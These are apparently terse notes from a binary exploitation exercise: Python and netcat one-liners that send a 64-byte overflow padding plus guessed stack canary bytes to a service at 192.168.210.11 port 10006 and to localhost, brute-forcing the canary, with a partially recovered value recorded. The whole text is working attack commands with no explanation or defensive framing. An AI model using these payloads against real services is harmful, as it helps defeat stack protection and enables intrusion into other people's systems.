```
# brute force get cannary

python -c 'print "A" * 64 + "\x00\xbf\x1d\x00"' | nc 192.168.210.11 10006 && echo 00 && \
python -c 'print "A" * 64 + "\x00\xbf\x1d\xff"' | nc 192.168.210.11 10006 && echo ff
\x00\xbf\x1d\xaa
```

```
# Local machine canary
python -c 'print "A" * 64 + "\x00\x13\xe0\xaf"' | nc 127.0.0.1 10006
```